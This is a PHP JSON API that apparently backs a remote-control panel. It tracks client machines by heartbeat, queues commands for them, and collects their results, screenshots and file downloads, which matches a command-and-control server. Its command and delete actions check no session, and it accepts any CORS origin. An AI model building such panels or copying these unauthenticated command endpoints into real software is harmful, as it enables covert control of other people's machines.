<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
header('Access-Control-Allow-Headers: Content-Type');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

require_once 'config.php';

$method = $_SERVER['REQUEST_METHOD'];

// 处理 CORS 预检请求
if ($method === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$action = $_GET['action'] ?? '';

$db = getDB();
$logger = Logger::getInstance();

try {
    switch ($action) {
        case 'list_clients':
            dbRunWithRetry(function () use ($db) {
                $db->exec("UPDATE clients SET status = 'offline' WHERE last_seen < datetime('now', '-30 seconds') AND status != 'offline'");
                $db->exec("UPDATE clients SET status = 'online' WHERE last_seen >= datetime('now', '-30 seconds') AND status != 'online'");
            });

            // 获取所有客户端列表
            $stmt = dbQueryWithRetry($db, "SELECT * FROM clients ORDER BY last_seen DESC");
            $clients = normalizeData($stmt->fetchAll());

            $logger->info('API: list clients', ['count' => count($clients)]);
            echo json_encode(['success' => true, 'data' => $clients]);
            break;

        case 'get_client':
            // Get one client.
            $clientId = $_GET['client_id'] ?? '';
            dbRunWithRetry(function () use ($db, $clientId) {
                $stmt = $db->prepare("UPDATE clients SET status = CASE WHEN last_seen < datetime('now', '-30 seconds') THEN 'offline' ELSE 'online' END WHERE client_id = ?");
                $stmt->execute([$clientId]);
            });
            $stmt = dbExecuteWithRetry($db, "SELECT * FROM clients WHERE client_id = ?", [$clientId]);
            $client = normalizeData($stmt->fetch());

            $logger->info('API: get client', ['client_id' => $clientId]);
            echo json_encode(['success' => true, 'data' => $client]);
            break;

        case 'get_logs':
            // Get client logs.
            $clientId = $_GET['client_id'] ?? '';
            $limit = intval($_GET['limit'] ?? 100);
            $stmt = $db->prepare(
                "SELECT * FROM command_logs WHERE client_id = ? ORDER BY created_at DESC LIMIT ?"
            );
            $stmt->execute([$clientId, $limit]);
            $logs = normalizeData($stmt->fetchAll());

            $logger->debug('API: get client logs', ['client_id' => $clientId, 'limit' => $limit]);
            echo json_encode(['success' => true, 'data' => $logs]);
            break;

        case 'get_screenshots':
            // 获取截图列表
            $clientId = $_GET['client_id'] ?? '';
            $stmt = $db->prepare(
                "SELECT * FROM screenshots WHERE client_id = ? ORDER BY created_at DESC LIMIT 50"
            );
            $stmt->execute([$clientId]);
            $screenshots = normalizeData($stmt->fetchAll());

            $logger->debug('API: get screenshots', ['client_id' => $clientId]);
            echo json_encode(['success' => true, 'data' => $screenshots]);
            break;

        case 'delete_client':
            // Delete client.
            $clientId = $_GET['client_id'] ?? '';
            $stmt = $db->prepare("DELETE FROM clients WHERE client_id = ?");
            $stmt->execute([$clientId]);

            $logger->warning('API: delete client', ['client_id' => $clientId]);
            echo json_encode(['success' => true, 'message' => '客户端已删除']);
            break;

        case 'statistics':
            // 閼惧嘲褰囩紒鐔活吀娣団剝浼?
            $totalClients = $db->query("SELECT COUNT(*) FROM clients")->fetchColumn();
            $onlineClients = $db->query(
                "SELECT COUNT(*) FROM clients WHERE status = 'online'"
            )->fetchColumn();
            $totalCommands = $db->query("SELECT COUNT(*) FROM command_logs")->fetchColumn();
            $totalScreenshots = $db->query("SELECT COUNT(*) FROM screenshots")->fetchColumn();

            echo json_encode([
                'success' => true,
                'data' => [
                    'total_clients' => $totalClients,
                    'online_clients' => $onlineClients,
                    'total_commands' => $totalCommands,
                    'total_screenshots' => $totalScreenshots
                ]
            ]);
            break;

        case 'send_command':
            $input = json_decode(file_get_contents('php://input'), true);
            $clientId = $input['client_id'] ?? '';
            $command = $input['command'] ?? [];

            // Add pending command for the client to fetch on heartbeat.
            $stmt = $db->prepare(
                "INSERT INTO commands (client_id, command, params, status) VALUES (?, ?, ?, 'pending')"
            );
            $stmt->execute([$clientId, $command['type'] ?? 'unknown', json_encode($command)]);
            $commandId = (int)$db->lastInsertId();

            // Write command history.
            $stmt2 = $db->prepare(
                "INSERT INTO command_logs (client_id, command_type, command_data) VALUES (?, ?, ?)"
            );
            $stmt2->execute([$clientId, $command['type'] ?? 'unknown', json_encode($command)]);

            $logger->info('API: send command', [
                'client_id' => $clientId,
                'command_type' => $command['type'] ?? 'unknown',
                'command_id' => $commandId
            ]);

            echo json_encode(['success' => true, 'message' => 'Command sent', 'command_id' => $commandId]);
            break;

        case 'get_command_results':
            $clientId = $_GET['client_id'] ?? '';
            $commandType = $_GET['command'] ?? '';
            $limit = intval($_GET['limit'] ?? 50);
            $path = $_GET['path'] ?? '';
            $commandId = intval($_GET['command_id'] ?? 0);
            if ($commandId > 0) {
                $stmt = $db->prepare("SELECT * FROM commands WHERE id = ? AND client_id = ? AND status IN ('completed','failed') AND result IS NOT NULL LIMIT 1");
                $stmt->execute([$commandId, $clientId]);
                $data = normalizeData($stmt->fetchAll());
                foreach ($data as &$row) {
                    if (!empty($row['result'])) {
                        $decoded = json_decode($row['result'], true);
                        if ($decoded !== null) {
                            $row['result'] = normalizeData($decoded);
                        } else {
                            $row['result'] = normalizeText($row['result']);
                        }
                    }
                }
                echo json_encode(['success' => true, 'data' => $data]);
                break;
            }
            if ($commandType) {
                if ($path !== '') {
                    $stmt = $db->prepare("SELECT * FROM commands WHERE client_id = ? AND command = ? AND status IN ('completed','failed') AND result IS NOT NULL AND params LIKE ? ORDER BY executed_at DESC LIMIT ?");
                    $stmt->execute([$clientId, $commandType, '%' . $path . '%', $limit]);
                } else {
                    $stmt = $db->prepare("SELECT * FROM commands WHERE client_id = ? AND command = ? AND status IN ('completed','failed') AND result IS NOT NULL ORDER BY executed_at DESC LIMIT ?");
                    $stmt->execute([$clientId, $commandType, $limit]);
                }
            } else {
                $stmt = $db->prepare("SELECT * FROM commands WHERE client_id = ? AND status IN ('completed','failed') AND result IS NOT NULL ORDER BY executed_at DESC LIMIT ?");
                $stmt->execute([$clientId, $limit]);
            }
            $data = normalizeData($stmt->fetchAll());
            foreach ($data as &$row) {
                if (!empty($row['result'])) {
                    $decoded = json_decode($row['result'], true);
                    if ($decoded !== null) {
                        $row['result'] = normalizeData($decoded);
                    } else {
                        $row['result'] = normalizeText($row['result']);
                    }
                }
            }
            echo json_encode(['success' => true, 'data' => $data]);
            break;

        case 'get_download_progress':
            $clientId = $_GET['client_id'] ?? '';
            $path = $_GET['path'] ?? '';
            $stmt = $db->prepare("SELECT * FROM download_progress WHERE client_id = ? AND path = ? ORDER BY id DESC LIMIT 1");
            $stmt->execute([$clientId, $path]);
            $progress = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($progress) {
                $pct = $progress['total_chunks'] > 0 ? round($progress['received_chunks'] / $progress['total_chunks'] * 100, 1) : 0;
                echo json_encode([
                    'success' => true,
                    'data' => [
                        'total_chunks' => (int)$progress['total_chunks'],
                        'received_chunks' => (int)$progress['received_chunks'],
                        'total_bytes' => (int)$progress['total_bytes'],
                        'percent' => $pct,
                        'status' => $progress['status']
                    ]
                ]);
            } else {
                echo json_encode(['success' => false, 'error' => 'No progress data']);
            }
            break;

        case 'get_system_logs':
            // 获取系统日志
            $level = $_GET['level'] ?? '';
            $limit = intval($_GET['limit'] ?? 100);

            $sql = "SELECT * FROM system_logs";
            if ($level && in_array($level, ['DEBUG', 'INFO', 'WARNING', 'ERROR'])) {
                $sql .= " WHERE level = :level";
            }
            $sql .= " ORDER BY created_at DESC LIMIT :limit";

            $stmt = $db->prepare($sql);
            if ($level) {
                $stmt->bindValue(':level', $level);
            }
            $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
            $stmt->execute();

            $logs = normalizeData($stmt->fetchAll());
            echo json_encode(['success' => true, 'data' => $logs]);
            break;

        case 'get_log_files':
            // 获取日志文件列表
            $files = Logger::getLogFiles();
            echo json_encode(['success' => true, 'data' => $files]);
            break;

        case 'read_log_file':
            // 读取日志文件内容
            $filename = $_GET['filename'] ?? '';
            $lines = intval($_GET['lines'] ?? 100);

            $content = Logger::readLog($filename, $lines);
            echo json_encode(['success' => true, 'data' => normalizeData($content)]);
            break;

        case 'clear_old_data':
            // Clear old data.
            $days = intval($_GET['days'] ?? 7);

            // Delete old offline clients.
            $stmt = $db->prepare(
                "DELETE FROM clients WHERE status = 'offline' AND last_seen < datetime('now', '-' || ? || ' days')"
            );
            $stmt->execute([$days]);
            $deletedClients = $stmt->rowCount();

            // 删除旧命令日志
            $stmt = $db->prepare(
                "DELETE FROM command_logs WHERE created_at < datetime('now', '-' || ? || ' days')"
            );
            $stmt->execute([$days]);
            $deletedLogs = $stmt->rowCount();

            // 删除旧系统日志
            $stmt = $db->prepare(
                "DELETE FROM system_logs WHERE created_at < datetime('now', '-' || ? || ' days')"
            );
            $stmt->execute([$days]);
            $deletedSysLogs = $stmt->rowCount();

            $logger->info('API: clear old data', [
                'days' => $days,
                'deleted_clients' => $deletedClients,
                'deleted_logs' => $deletedLogs,
                'deleted_system_logs' => $deletedSysLogs
            ]);

            echo json_encode([
                'success' => true,
                'message' => '数据清理完成',
                'data' => [
                    'deleted_clients' => $deletedClients,
                    'deleted_logs' => $deletedLogs,
                    'deleted_system_logs' => $deletedSysLogs
                ]
            ]);
            break;

            // ===== 认证相关 =====
        case 'login':
            $input = json_decode(file_get_contents('php://input'), true);
            $username = trim(($input['username'] ?? '') ?: ($_GET['username'] ?? ''));
            $password = ($input['password'] ?? '') ?: ($_GET['password'] ?? '');

            // 从数据库验证
            $stmt = $db->prepare("SELECT * FROM admins WHERE username = ?");
            $stmt->execute([$username]);
            $admin = $stmt->fetch();
            if (!$admin || !password_verify($password, $admin['password_hash'])) {
                echo json_encode(['success' => false, 'error' => '用户名或密码错误']);
                break;
            }
            // 清理旧 session
            // 清理旧 session 并创建新 session。SQLite 高并发写入时可能短暂锁库，这里统一重试。
            $token = dbRunWithRetry(function () use ($db, $admin) {
                $token = bin2hex(random_bytes(32));
                $db->beginTransaction();
                try {
                    $stmt = $db->prepare("DELETE FROM sessions WHERE admin_id = ?");
                    $stmt->execute([$admin['id']]);
                    $stmt = $db->prepare("INSERT INTO sessions (admin_id, token, expires_at) VALUES (?, ?, datetime('now', '+1 day'))");
                    $stmt->execute([$admin['id'], $token]);
                    $db->commit();
                    return $token;
                } catch (Exception $e) {
                    if ($db->inTransaction()) {
                        $db->rollBack();
                    }
                    throw $e;
                }
            });
            $logger->info('API: admin login', ['username' => $username]);
            echo json_encode(['success' => true, 'data' => ['token' => $token, 'username' => $username]]);
            break;

        case 'verify_session':
            $token = $_GET['token'] ?? $_POST['token'] ?? '';
            if (!$token) {
                echo json_encode(['success' => false, 'valid' => false]);
                break;
            }
            $stmt = $db->prepare("SELECT username FROM sessions JOIN admins ON sessions.admin_id = admins.id WHERE sessions.token = ? AND sessions.expires_at > datetime('now')");
            $stmt->execute([$token]);
            $row = $stmt->fetch();
            if ($row) {
                echo json_encode(['success' => true, 'valid' => true, 'data' => ['username' => $row['username']]]);
            } else {
                echo json_encode(['success' => true, 'valid' => false]);
            }
            break;

        case 'logout':
            $input = json_decode(file_get_contents('php://input'), true);
            $token = $input['token'] ?? $_GET['token'] ?? '';
            if ($token) {
                dbExecuteWithRetry($db, "DELETE FROM sessions WHERE token = ?", [$token]);
            }
            echo json_encode(['success' => true]);
            break;

        default:
            $logger->warning('API: unknown action', ['action' => $action]);
            echo json_encode(['success' => false, 'error' => '未知操作']);
    }
} catch (Exception $e) {
    http_response_code(500);
    $logger->error("API exception: " . $e->getMessage(), [
        'action' => $action,
        'file' => $e->getFile(),
        'line' => $e->getLine()
    ]);
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}

